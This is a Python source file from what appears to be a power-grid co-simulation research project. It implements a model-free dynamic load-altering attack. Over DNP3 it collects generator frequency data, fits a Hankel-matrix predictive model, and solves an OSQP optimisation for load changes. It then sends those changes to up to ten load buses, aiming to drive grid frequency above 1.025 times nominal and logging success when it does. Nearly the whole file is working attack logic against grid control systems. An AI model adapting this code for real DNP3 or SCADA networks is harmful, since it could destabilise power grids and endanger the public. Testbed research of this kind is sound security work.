import numpy as np
import logging
import osqp
import time

from scipy.sparse import csc_matrix, triu

from pydnp3.opendnp3 import GroupVariation

from cosim.mylogging import getLogger
from cosim.dnp3.soe_handler import SOEHandlerAdjusted
from cosim.dnp3.lfc.LFC_master import MasterStation
from cosim.dnp3.lfc.mdlaa.secondary_MDLAA_handler import MDLAAHandlerSecondary


log = getLogger(__name__, "logs/MDLAA.log")
freq_log = getLogger("freqs", "logs/freqs.log", formatter=logging.Formatter("%(message)s"))


# System parameters
NUM_LOAD_BUSES = 18 # number of attackable load buses
NUM_GEN_BUSES = 10  # number of generator buses
NOMINAL_PS = np.array([320, 329, 628, 274, 322, 158, 224, 500, 233.8, 522, \
                       247.5, 308.6, 139, 281, 206, 283.5, 7.5, 1104]) # MW
NOMINAL_FREQ = 60   # HZ
Omega_r = 1.025     # Attack success threshold
Ta = 1000           # Historical data length (must be >> Tini + Nap)
Tini = 20           # Initialization window (past steps to match)
Nap = 40            # Prediction horizon (future steps to optimize)
Nac = 10            # Control horizon (steps to apply)
max_attack = 0.50 * NOMINAL_PS    # Max x% load alteration per bus
min_attack = -0.25 * NOMINAL_PS  # Min x% load alteration per bus

waiting_iters = -300 # number of iterations to skip due to waiting for the system to settle
step_time = 100    # ms
redo_full_osqp = False


class MDLAASOEHandler(SOEHandlerAdjusted):
    def __init__(self, log_file_path="logs/soehandler.log", soehandler_log_level=logging.INFO, station_ref=None, attacks=np.zeros(NUM_LOAD_BUSES), *args, **kwargs):
        super().__init__(log_file_path, soehandler_log_level, station_ref, *args, **kwargs)
        # OSQP solver time statistics
        self._avg_osqp_solving_time = 0.0
        self._num_of_osqp_solved = 0
        
        # MDLAA parameters
        self._Q = 1e5 * np.eye(NUM_GEN_BUSES)  # Weight for frequency deviation penalty
        self._R = 1e1 * np.eye(NUM_LOAD_BUSES) # Weight for attack effort penalty
        
        # Constants
        self._NUM_OF_ATTACKED_LOADS = 10
        self._MAX_ATTACK_ITER = Ta / Nac
        self._RND_ATTACK_STRENGTH = 0.01 # pu
        
        # MDLAA freq and attack storage
        self._curr_freqs = np.zeros(NUM_GEN_BUSES)
        self._curr_attack_temp = np.zeros(NUM_LOAD_BUSES)
        self._curr_attack = attacks # Used to apply the attack through the second master station
        
        # Counters
        self._measurement_iter = waiting_iters
        self._ka = Tini
        self._attack_to_apply = -1
    
        # History of max and min attacks
        self._all_max_attack = np.zeros(NUM_LOAD_BUSES)
        self._all_min_attack = np.zeros(NUM_LOAD_BUSES)
    
        # Data storage for historical attacks and frequencies
        self._U = np.empty([NUM_LOAD_BUSES, Ta])
        self._Y = np.empty([NUM_GEN_BUSES, Ta])
        self._attack_history = np.zeros([NUM_LOAD_BUSES, Tini])  # Stores Tini past attacks
        self._freq_history = np.zeros([NUM_GEN_BUSES, Tini])     # Stores Tini past frequencies 
        
        self._osqp = osqp.OSQP()  
    
    
    def _process_incoming_data(self, info_gv, visitor_index_and_value):        
        if info_gv in [GroupVariation.Group30Var6]:
            self._read_frequencies(visitor_index_and_value)
            if self._log_and_skip_if_MDLAA_successful():
                return
            
            # MDLAA first phase - collect data
            if self._measurement_iter < Ta:
                self._execute_MDLAA_first_phase()
                return
            
            self._update_freq_history()
            
            # MDLAA second phase - predict attacks
            if self._attack_to_apply == -1:
                self._execute_MDLAA_second_phase()
                return
                
            # MDLAA third phase - apply attacks
            self._execute_MDLAA_third_phase()
    
    
    def _read_frequencies(self, visitor_index_and_value):
        for i in range(NUM_GEN_BUSES):
            self._curr_freqs[i] = visitor_index_and_value[i][1] / 1000
        log.info(f"Freqs: {['{0:.5f}'.format(i) for i in self._curr_freqs.tolist()]}")
        freq_log.info(",".join([str(i) for i in self._curr_freqs]))
            
        
    # ---First phase---
    def _execute_MDLAA_first_phase(self):
        log.info(f"Iter: {self._measurement_iter}")
        if self._measurement_iter >= 0:
            self._generate_and_apply_random_attack()
            self._collect_measurements()
        self._measurement_iter += 1   
        if self._measurement_iter == Ta:
            self._prepare_OSQP_parameters()
        
    
    def _update_freq_history(self):
        if redo_full_osqp:
            self._Y = np.roll(self._Y, -1, axis=1)
            self._Y[:, -1] = self._curr_freqs 
        else:
            self._freq_history = np.roll(self._freq_history, -1, axis=1)
            self._freq_history[:, -1] = self._curr_freqs
    
    def _update_attack_history(self):
        if redo_full_osqp:
            self._U = np.roll(self._U, -1, axis=1)
            self._U[:, -1] = self._curr_attack_temp
        else:
            self._attack_history = np.roll(self._attack_history, -1, axis=1)
            self._attack_history[:, -1] = self._curr_attack_temp
    
    
    # ---Attack handling---
    def _generate_and_apply_random_attack(self):
        self._curr_attack_temp = -10 * (self._curr_freqs[5] - NOMINAL_FREQ) / NOMINAL_FREQ * NOMINAL_PS \
            + np.random.uniform(-self._RND_ATTACK_STRENGTH, self._RND_ATTACK_STRENGTH, NUM_LOAD_BUSES) * NOMINAL_PS
        for i in range(NUM_LOAD_BUSES):
            self._curr_attack[i] = self._curr_attack_temp[i]
        self._do_attack()
    
    def _do_attack(self):
        self._correct_attacks_beyond_bounds()
        self._update_and_log_all_time_max_min_attacks()
        self._send_attack_to_outstation()
    
    def _correct_attacks_beyond_bounds(self):
        for i in range(NUM_LOAD_BUSES):
            if self._curr_attack[i] > max_attack[i]:
                log.debug(f"Attack {i} is above the max_attack: {self._curr_attack[i]} > {max_attack[i]}")
                self._curr_attack[i] = max_attack[i]
            elif self._curr_attack[i] < min_attack[i]:
                log.debug(f"Attack {i} is below the min_attack: {self._curr_attack[i]} < {min_attack[i]}")
                self._curr_attack[i] = min_attack[i] 

    def _send_attack_to_outstation(self):
        loads = self._curr_attack[:self._NUM_OF_ATTACKED_LOADS]
        for i in range(self._NUM_OF_ATTACKED_LOADS):
            self.station_ref.send_direct_point_command(40, 4, i, float(loads[i]))
        log.debug(f"Doing DLAA: {loads}")
    
    
    def _collect_measurements(self):
        # Freqs delayed by one step and attacks ended one step faster,
        # because the attack at t affects the frequency at t+1
        if self._measurement_iter < Ta:
            self._U[:, self._measurement_iter] = self._curr_attack_temp
            log.debug(f"Attack loads pu: {self._curr_attack_temp.tolist()}")
            log.debug(f"Loads: {['{0:.4f}'.format(i) for i in self._U[:, self._measurement_iter].tolist()]}")    
        if self._measurement_iter > 0:
            self._Y[:, self._measurement_iter-1] = self._curr_freqs
            log.debug(f"Freqs: {['{0:.5f}'.format(i) for i in self._Y[:, self._measurement_iter-1].tolist()]}")  
    
    
    def _prepare_OSQP_parameters(self):
        log.info("Preparing OSQP problem...")
        self._attack_history = self._U[:, :Tini]
        self._freq_history = self._Y[:, :Tini]
        
        HU = self._build_hankel(self._U, Tini + Nap) # Shape: [(Tini+Nap)*num_load_buses, Ta-Tini-Nap+1]
        HY = self._build_hankel(self._Y, Tini + Nap) # Shape: [(Tini+Nap)*num_gen_buses, Ta-Tini-Nap+1]

        # Split into past/future blocks
        self._Up = HU[:Tini*NUM_LOAD_BUSES, :]
        self._Uf = HU[Tini*NUM_LOAD_BUSES:(Tini+Nap)*NUM_LOAD_BUSES, :]
        self._Yp = HY[:Tini*NUM_GEN_BUSES, :]
        self._Yf = HY[Tini*NUM_GEN_BUSES:(Tini+Nap)*NUM_GEN_BUSES, :]
        
        self._assert_Hankel_full_rank()
        
        # Construct OSQP problem
        self._H = self._Yf.T @ np.kron(np.eye(Nap), self._Q) @ self._Yf + self._Uf.T @ np.kron(np.eye(Nap), self._R) @ self._Uf
        self._f = -self._Yf.T @ np.kron(np.eye(Nap), self._Q) @ np.tile(Omega_r, (Nap * NUM_GEN_BUSES, 1))    
        
    
    def _build_hankel(self, data, L):
        cols = data.shape[1] - L + 1  # Number of columns in Hankel matrix
        H = np.zeros((L * data.shape[0], cols))
        for i in range(L):
            row_block = data[:, i:i+cols]
            H[i*data.shape[0]:(i+1)*data.shape[0], :] = row_block
        return H
     
    
    # ---Second phase---
    def _execute_MDLAA_second_phase(self):
        self._exit_if_max_attack_reached()
        log.info(f"Attack start from index: {self._ka}")
        
        # Start measuring OSQP solving time
        log.info("Solving OSQP")    
        osqp_solving_start_time = time.time_ns()
        
        u_ini = self._attack_history.flatten(order='F')  # Column-wise flattening
        y_ini = self._freq_history.flatten(order='F')    
        if self._ka == Tini:
            self._initialize_OSQP_solver(u_ini, y_ini)
        else:
            if redo_full_osqp:
                self._prepare_OSQP_parameters()
                self._reinitialize_OSQP_solver(u_ini, y_ini)
            else:
                self._update_OSQP_constraints_with_latest_measurements(u_ini, y_ini)    
        OSQP_result = self._osqp.solve() 
        
        # Log OSQP solving time
        osqp_solving_time = (time.time_ns() - osqp_solving_start_time) / 1e6
        self._log_OSQP_solving_time_and_avg_time(osqp_solving_time)
        
        # Handling OSQP result
        self._ka += Nac
        if self._skip_with_random_attack_if_optimization_failed(OSQP_result.info.status):
            return
        self._extract_optimal_attacks(OSQP_result.x)
        
        self._attack_to_apply = 0
    
    # ---OSQP solver---
    def _initialize_OSQP_solver(self, u_ini, y_ini):
        self._construct_constraints(u_ini, y_ini)
        self._assert_residuals_small_enough()
        self._osqp.setup(
            P=csc_matrix(self._H), q=self._f.flatten(),
            A=csc_matrix(self._A), l=self._lb, u=self._ub,
            verbose=False)
    
    def _construct_constraints(self, u_ini, y_ini):
        # [Up; Yp] * g = [u_ini; y_ini]
        self._A_eq = np.vstack([self._Up, self._Yp])
        self._lb_eq = np.hstack([u_ini, y_ini])
        self._ub_eq = self._lb_eq 
        # min_attack <= Uf * g <= max_attack (repeated for N steps)
        self._A_ineq = self._Uf
        self._ub_ineq = np.tile(max_attack, Nap) # Upper bound - twice the nominal power
        self._lb_ineq = np.tile(min_attack, Nap) # Lower bound - half the nominal power
        # Combine constraints
        self._A = np.vstack([self._A_eq, self._A_ineq])
        self._lb = np.hstack([self._lb_eq, self._lb_ineq])
        self._ub = np.hstack([self._ub_eq, self._ub_ineq])                    
       
    
    def _reinitialize_OSQP_solver(self, u_ini, y_ini):
        self._construct_constraints(u_ini, y_ini)
        self._assert_residuals_small_enough()
        self._osqp = osqp.OSQP()
        self._osqp.setup(
            P=csc_matrix(self._H), q=self._f.flatten(),
            A=csc_matrix(self._A), l=self._lb, u=self._ub,
            verbose=False)
        # self._osqp.update(
        #     Px=triu(csc_matrix(self._H)).data, q=self._f.flatten(),
        #     Ax=csc_matrix(self._A).data, l=self._lb, u=self._ub)
    
    
    def _update_OSQP_constraints_with_latest_measurements(self, u_ini, y_ini):
        self._lb_eq = np.hstack([u_ini, y_ini])
        self._ub_eq = self._lb_eq   
        self._lb = np.hstack([self._lb_eq, self._lb_ineq])
        self._ub = np.hstack([self._ub_eq, self._ub_ineq])                    
        self._osqp.update(l=self._lb, u=self._ub)
             
    
    def _extract_optimal_attacks(self, result):
        log.info("OSQP Solved successfully")
        g_optimal = result
        u_opt = (self._Uf @ g_optimal).reshape(Nap, NUM_LOAD_BUSES)
        self._optimal_attacks_to_apply = u_opt[:Nac, :]
    
    
    # ---Third phase---
    def _execute_MDLAA_third_phase(self):
        self._apply_predicted_attack()
        self._update_attack_history()
        if self._attack_to_apply == Nac-1:
            self._attack_to_apply = -1
        else:
            self._attack_to_apply += 1
     
    
    def _apply_predicted_attack(self):
        self._curr_attack_temp = self._optimal_attacks_to_apply[self._attack_to_apply, :]
        for i in range(NUM_LOAD_BUSES):
            self._curr_attack[i] = self._curr_attack_temp[i]
        log.debug(f"Success, attack: {[float(load) for load in self._curr_attack]}")
        self._do_attack()


    # ---Failure handling---
    def _assert_Hankel_full_rank(self):
        combined_Hankel = np.vstack([self._Up, self._Yp, self._Uf, self._Yf])
        rank = np.linalg.matrix_rank(combined_Hankel)
        log.info(f"Rank of combined Hankel matrix: {rank} / {combined_Hankel.shape[1]} columns")
        assert rank == combined_Hankel.shape[1], "Hankel matrix is not full rank"
    
    def _assert_residuals_small_enough(self):
        # Checking if [u_ini; y_ini] lies in the column space of [Up; Yp]
        # Solving least-squares: Find g such that A_eq * g ≈ target
        g_ls = np.linalg.lstsq(self._A_eq, self._lb_eq, rcond=None)[0]
        residual = np.linalg.norm(self._A_eq @ g_ls - self._lb_eq)
        log.info(f"Least-squares residual: {residual}")
        assert residual <= 1e-6, "Initial conditions incompatible with historical data!"   
    
    def _skip_with_random_attack_if_optimization_failed(self, status):
        if status != "solved" and status != "solved inaccurate":
            log.warning(f"Optimization failed. Status: {status}. Skipping...")
            # If problem infeasible, apply random attack
            self._generate_and_apply_random_attack()
            self._update_attack_history()
            return True
        return False
    
    def _exit_if_max_attack_reached(self):
        if self._ka > Ta - Nap:
            log.error("MDLAA exceeded max attack iterations. Stopping...")
            del self.station_ref
            exit()


    # ---Logging---
    def _log_and_skip_if_MDLAA_successful(self):   
        for freq in self._curr_freqs:
            if freq >= Omega_r * NOMINAL_FREQ:
                log.warning(f"MDLAA SUCCESSFUL: {self._curr_freqs}")
                return True
        return False
    
    def _update_and_log_all_time_max_min_attacks(self):
        for i in range(NUM_LOAD_BUSES):
            if self._curr_attack[i] > self._all_max_attack[i]:
                self._all_max_attack[i] = self._curr_attack[i]
            elif self._curr_attack[i] < self._all_min_attack[i]:
                self._all_min_attack[i] = self._curr_attack[i]
        log.debug(f"Max attacks: {self._all_max_attack.tolist()}")
        log.debug(f"Min attacks: {self._all_min_attack.tolist()}")
    
    def _log_OSQP_solving_time_and_avg_time(self, osqp_solving_time):
        self._avg_osqp_solving_time = (self._avg_osqp_solving_time * self._num_of_osqp_solved + osqp_solving_time) / (self._num_of_osqp_solved + 1)
        self._num_of_osqp_solved += 1
        log.info(f"OSQP solving time avg: {self._avg_osqp_solving_time:.2f} ms, last: {osqp_solving_time:.2f} ms")        


def main():
    logs_file = "logs/d_r_lfc_mdlaa.log"
    outstation_ip = "172.24.14.212"
    port = 20001
    outstation_ip2 = "172.24.14.213"
    port2 = 20002
    
    scan_time = step_time # ms
    loads_coeffs = np.zeros(NUM_LOAD_BUSES)
        
    master = MasterStation(outstation_ip=outstation_ip, port=port, master_id=1, outstation_id=2)
    soe_handler = MDLAASOEHandler(logs_file, station_ref=master, attacks=loads_coeffs)
    master.configure_master(soe_handler, outstation_ip, port, scan_time=scan_time)
    
    master2 = MasterStation(outstation_ip=outstation_ip2, port=port2, master_id=1, outstation_id=2)
    soe_handler2 = MDLAAHandlerSecondary(logs_file, station_ref=master2, attack=loads_coeffs)
    master2.configure_master(soe_handler2, outstation_ip2, port2, scan_time=scan_time)
    
    master.start()
    master2.start()
    
    time.sleep(1_000_000_000)
    del master
    del master2
    exit()


if __name__ == "__main__":
    main()